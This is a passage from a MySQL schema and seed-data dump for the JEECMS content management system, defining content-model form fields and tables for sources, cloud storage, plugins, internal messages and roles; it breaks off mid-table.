INSERT INTO `jc_model_item` VALUES (177, 6, 'afterCheck', '审核后', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (178, 6, 'commentControl', '评论', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (179, 6, 'allowUpdown', '顶踩', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (180, 6, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (181, 6, 'contriGroupIds', '投稿权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (183, 6, 'link', '外部链接', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (184, 6, 'titleImg', '标题图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (185, 6, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (186, 6, 'channelId', '栏目', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (187, 6, 'title', '标题', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (188, 6, 'shortTitle', '简短标题', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (189, 6, 'titleColor', '标题颜色', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (190, 6, 'tagStr', 'Tag标签', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (191, 6, 'description', '内容简介', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (192, 6, 'author', '作者', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (193, 6, 'origin', '来源', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (194, 6, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (195, 6, 'topLevel', '固顶级别', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (196, 6, 'releaseDate', '发布时间', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 5, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (197, 6, 'typeId', '内容类型', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (198, 6, 'tplContent', '指定模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (199, 6, 'typeImg', '类型图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (200, 6, 'titleImg', '标题图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (201, 6, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (202, 6, 'attachments', '附件', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (203, 6, 'media', '多媒体', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (246, 4, 'titleImg', '标题图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (249, 8, 'name', '栏目名称', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (250, 8, 'path', '访问路径', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (251, 8, 'title', 'meta标题', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (252, 8, 'keywords', 'meta关键字', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (253, 8, 'description', 'meta描述', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (254, 8, 'tplChannel', '栏目模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (255, 8, 'tplContent', '选择模型模板', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (256, 8, 'channelStatic', '栏目静态化', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (257, 8, 'contentStatic', '内容静态化', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (258, 8, 'priority', '排列顺序', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 2, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (259, 8, 'display', '显示', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (260, 8, 'docImg', '文档图片', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (262, 8, 'afterCheck', '审核后', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (263, 8, 'commentControl', '评论', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (264, 8, 'allowUpdown', '顶踩', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (265, 8, 'viewGroupIds', '浏览权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (266, 8, 'contriGroupIds', '投稿权限', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (268, 8, 'link', '外部链接', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (269, 8, 'titleImg', '标题图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (270, 8, 'contentImg', '内容图', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (271, 8, 'channelId', '栏目', 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (272, 8, 'title', '岗位名称', 1, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (275, 8, 'tagStr', 'Tag标签', 7, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (279, 8, 'viewGroupIds', '浏览权限', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (280, 8, 'topLevel', '固顶级别', 7, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (281, 8, 'releaseDate', '发布时间', 2, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 5, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (282, 8, 'typeId', '内容类型', 7, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (283, 8, 'tplContent', '指定模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (289, 8, 'txt', '职位描述', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (290, 8, 'deadline', '截止日期', 2, NULL, NULL, NULL, '3', '30', '留空永久有效', NULL, 5, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (291, 8, 'experience', '工作经验', 3, NULL, '1-3年,3-5年,5年以上,不限', NULL, '3', '30', NULL, NULL, 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (292, 8, 'education', '最低学历', 3, '', '专科,本科,硕士,不限', '', '3', '30', '', '', 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (293, 8, 'salary', '职位月薪', 4, NULL, '1500-2000,2000-3000,3000-5000,5000-8000,8000以上,面议', NULL, '3', '30', NULL, NULL, 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (294, 8, 'workplace', '工作地点', 4, '', '北京,上海,深圳,广州,重庆,南京,杭州,西安,南昌', '', '3', '30', '', '', 7, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (295, 8, 'nature', '工作性质', 5, '', '全职,兼职', '', '3', '30', '', '', 8, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (296, 8, 'hasmanage', '管理经验', 5, '', '要求,不要求', '', '3', '30', '', '', 8, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (297, 8, 'nums', '招聘人数', 6, '', '1-3人,3-5人,5-10人,若干', '', '3', '30', '', '', 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (298, 8, 'category', '职位类别', 6, NULL, '项目主管,java高级工程师,java工程师,网页设计师,测试人员,技术支持', NULL, '3', '30', NULL, NULL, 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (335, 1, 'workflowId', '工作流', 12, NULL, NULL, NULL, NULL, NULL, '留空则继承上级栏目设置，顶层为空无需审核', NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (338, 4, 'workflowId', '工作流', 10, NULL, NULL, NULL, NULL, NULL, '留空则继承上级栏目设置，顶层为空无需审核', NULL, 6, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (339, 5, 'workflowId', '工作流', 11, NULL, NULL, NULL, NULL, NULL, '留空则继承上级栏目设置，顶层为空无需审核', NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (340, 6, 'workflowId', '工作流', 11, NULL, NULL, NULL, NULL, NULL, '留空则继承上级栏目设置，顶层为空无需审核', NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (342, 8, 'workflowId', '工作流', 11, NULL, NULL, NULL, NULL, NULL, '留空则继承上级栏目设置，顶层为空无需审核', NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (344, 1, 'channelId', '栏目', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (403, 6, 'Director', '导演', 10, '', '', '', '1', '2', '', '', 1, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (404, 6, 'Starring', '主演', 10, '', '', '', '1', '30', '', '', 1, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (405, 6, 'VideoType', '视频类型', 10, NULL, '历史,古装,都市,喜剧,悬疑,动作,谍战,伦理,战争,惊悚', NULL, '3', '30', NULL, NULL, 7, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (406, 6, 'Video', '影片信息', 10, '', '正片,预告片', '', '3', '30', '', '', 6, 0, 0, 1, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (408, 1, 'contentImg', '内容图', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (409, 5, 'txt', '内容', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 0, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (410, 6, 'txt', '内容', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (412, 1, 'allowShare', '分享', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (413, 1, 'allowScore', '评分', 11, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 8, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (414, 1, 'pictures', '图片集', 12, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (416, 1, 'tplMobileChannel', '栏目手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (417, 1, 'tplMobileContent', '指定手机模板', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (418, 2, 'tplMobileChannel', '栏目手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (419, 2, 'channelStatic', '栏目静态化', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (420, 2, 'contentStatic', '内容静态化', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (421, 4, 'tplMobileChannel', '栏目手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (422, 4, 'channelStatic', '栏目静态化', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (423, 4, 'contentStatic', '内容静态化', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 4, 1, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (424, 4, 'tplMobileContent', '指定手机模板', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (425, 5, 'tplMobileChannel', '栏目手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (426, 6, 'tplMobileChannel', '栏目手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (431, 8, 'tplMobileChannel', '栏目手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 1, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (432, 8, 'tplMobileContent', '指定手机模板', 8, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (438, 1, 'charge', '是否收费', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (442, 4, 'size', '大小', 10, '', '', '', '', '', '', '', 1, 0, 0, 1, 1, 0, 100, 100);
INSERT INTO `jc_model_item` VALUES (443, 4, 'edition', '版本', 10, '', '', '', '', '', '', '', 1, 0, 0, 1, 1, 0, 100, 100);
INSERT INTO `jc_model_item` VALUES (444, 4, 'system', '支持系统', 10, '', '', '', '', '', '', '', 1, 0, 0, 1, 1, 0, 100, 100);
INSERT INTO `jc_model_item` VALUES (445, 4, 'bit', '位数', 10, '', '', '', '', '', '', '', 1, 0, 0, 1, 1, 0, 100, 100);
INSERT INTO `jc_model_item` VALUES (456, 4, 'charge', '是否收费', 10, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 7, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (457, 4, 'typeImg', '类型图', 9, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1, 1, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (486, 9, 'name', '栏目名称', 10, NULL, NULL, NULL, '3', '30', NULL, NULL, 1, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (487, 9, 'path', '访问路径', 10, NULL, NULL, NULL, '3', '30', NULL, NULL, 2, 0, 1, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (491, 9, 'title', '标题', 10, NULL, NULL, NULL, '3', '30', NULL, NULL, 1, 1, 0, 0, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (492, 9, 'tplContent', '指定内容模板', 10, NULL, NULL, NULL, '3', '30', NULL, NULL, 6, 0, 0, 0, 1, 0, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (498, 9, 'interviewContent', '面试海报', 10, '', '', '', '3', '30', '', '', 4, 1, 0, 1, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (499, 9, 'interviewDescribe', '描述', 10, '', '', '', '3', '30', '', '', 4, 1, 1, 1, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (500, 9, 'interviewUser', '面试官', 10, '', '', '', '3', '30', '', '', 1, 0, 0, 1, 1, 1, NULL, NULL);
INSERT INTO `jc_model_item` VALUES (501, 9, 'interviewTime', '面试时间', 10, '', '', '', '3', '30', '', '', 5, 0, 0, 1, 1, 1, NULL, NULL);

-- ----------------------------
-- Table structure for jc_origin
-- ----------------------------
DROP TABLE IF EXISTS `jc_origin`;
CREATE TABLE `jc_origin`  (
  `origin_id` int(11) NOT NULL AUTO_INCREMENT,
  `origin_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '来源名称',
  `ref_count` int(11) NOT NULL DEFAULT 0 COMMENT '来源文章总数',
  PRIMARY KEY (`origin_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '来源' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_origin
-- ----------------------------
INSERT INTO `jc_origin` VALUES (1, '新浪微博', 0);
INSERT INTO `jc_origin` VALUES (2, '百度', 0);
INSERT INTO `jc_origin` VALUES (3, '百度论坛', 0);
INSERT INTO `jc_origin` VALUES (4, '百度贴吧', 0);
INSERT INTO `jc_origin` VALUES (5, '新浪新闻', 0);
INSERT INTO `jc_origin` VALUES (6, '腾讯新闻', 0);

-- ----------------------------
-- Table structure for jc_oss
-- ----------------------------
DROP TABLE IF EXISTS `jc_oss`;
CREATE TABLE `jc_oss`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT 'id',
  `secret_id` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'secret_id',
  `app_key` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'secret key',
  `bucket_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'bucket名',
  `bucket_area` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '地区码',
  `oss_type` tinyint(2) NOT NULL DEFAULT 1 COMMENT '存储类型(1腾讯云cos  2阿里云oss  3七牛云)',
  `end_point` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT 'end_point',
  `access_domain` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '访问域名',
  `oss_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '名称',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'oss云存储配置' ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for jc_plug
-- ----------------------------
DROP TABLE IF EXISTS `jc_plug`;
CREATE TABLE `jc_plug`  (
  `plug_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '插件名称',
  `path` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '文件路径',
  `description` varchar(2000) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `author` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '作者',
  `upload_time` datetime NOT NULL COMMENT '上传时间',
  `install_time` datetime NULL DEFAULT NULL COMMENT '安装时间',
  `uninstall_time` datetime NULL DEFAULT NULL COMMENT '卸载时间',
  `file_conflict` tinyint(1) NOT NULL DEFAULT 0 COMMENT '包含文件是否冲突',
  `is_used` tinyint(1) NOT NULL DEFAULT 0 COMMENT '使用状态(0未使用,1使用中)',
  `plug_perms` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT '' COMMENT '插件权限（,分隔各个权限配置）',
  `plug_repair` tinyint(1) NOT NULL DEFAULT 0 COMMENT '是否修复类插件(0 新功能插件 1修复类)',
  PRIMARY KEY (`plug_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 2 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '插件' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_plug
-- ----------------------------
INSERT INTO `jc_plug` VALUES (1, '应用中心', '/WEB-INF/plug/plugStore.zip', '应用中心', 'jeecms', '2016-09-08 09:05:12', '2016-10-08 16:12:57', '2016-10-08 16:12:39', 0, 1, 'plugStore.center@store:center;storeConfig.edit@storeConfig:v_edit;storeConfig.update@storeConfig:o_update;', 0);

-- ----------------------------
-- Table structure for jc_plug_store_config
-- ----------------------------
DROP TABLE IF EXISTS `jc_plug_store_config`;
CREATE TABLE `jc_plug_store_config`  (
  `config_id` int(11) NOT NULL DEFAULT 1,
  `server_url` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '接口根地址',
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '应用商店密码',
  PRIMARY KEY (`config_id`) USING BTREE
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_plug_store_config
-- ----------------------------
INSERT INTO `jc_plug_store_config` VALUES (1, 'http://bbs.jeecms.com', '5f4dcc3b5aa765d61d8327deb882cf99');

-- ----------------------------
-- Table structure for jc_receiver_message
-- ----------------------------
DROP TABLE IF EXISTS `jc_receiver_message`;
CREATE TABLE `jc_receiver_message`  (
  `msg_re_id` int(11) NOT NULL AUTO_INCREMENT COMMENT '消息id',
  `msg_title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '标题',
  `msg_content` longtext CHARACTER SET utf8 COLLATE utf8_general_ci NULL COMMENT '站内信息内容',
  `send_time` timestamp NULL DEFAULT NULL COMMENT '发送时间',
  `msg_send_user` int(11) NOT NULL DEFAULT 1 COMMENT '发信息人',
  `msg_receiver_user` int(11) NOT NULL DEFAULT 0 COMMENT '接收人',
  `site_id` int(11) NOT NULL DEFAULT 1 COMMENT '站点',
  `msg_status` tinyint(1) NOT NULL DEFAULT 0 COMMENT '消息状态0未读，1已读',
  `msg_box` int(2) NOT NULL DEFAULT 1 COMMENT '消息信箱 0收件箱 1发件箱 2草稿箱 3垃圾箱',
  `msg_id` int(11) NULL DEFAULT NULL COMMENT '发信的信件id',
  PRIMARY KEY (`msg_re_id`) USING BTREE,
  INDEX `jc_receiver_message_user_send`(`msg_send_user`) USING BTREE,
  INDEX `jc_receiver_message_user_receiver`(`msg_receiver_user`) USING BTREE,
  INDEX `jc_receiver_message_site`(`site_id`) USING BTREE,
  INDEX `jc_receiver_message_message`(`msg_re_id`) USING BTREE,
  INDEX `fk_jc_receiver_message_message`(`msg_id`) USING BTREE,
  CONSTRAINT `fk_jc_receiver_message_message` FOREIGN KEY (`msg_id`) REFERENCES `jc_message` (`msg_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_receiver_message_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_receiver_message_user_receiver` FOREIGN KEY (`msg_receiver_user`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_receiver_message_user_send` FOREIGN KEY (`msg_send_user`) REFERENCES `jc_user` (`user_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = '站内信收信表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_receiver_message
-- ----------------------------
INSERT INTO `jc_receiver_message` VALUES (2, '1111', '1111', '2016-10-11 17:43:42', 1, 1, 1, 0, 3, NULL);
INSERT INTO `jc_receiver_message` VALUES (4, 'qqw', 'qwwqwww', '2016-10-12 09:51:10', 1, 1, 1, 0, 3, NULL);

-- ----------------------------
-- Table structure for jc_role
-- ----------------------------
DROP TABLE IF EXISTS `jc_role`;
CREATE TABLE `jc_role`  (
  `role_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NULL DEFAULT NULL,
  `role_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '角色名称',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `is_super` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '拥有所有权限',
  `role_level` int(11) NOT NULL DEFAULT 10 COMMENT '角色等级',
  PRIMARY KEY (`role_id`) USING BTREE,
  INDEX `fk_jc_role_site`(`site_id`) USING BTREE,
  CONSTRAINT `fk_jc_role_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
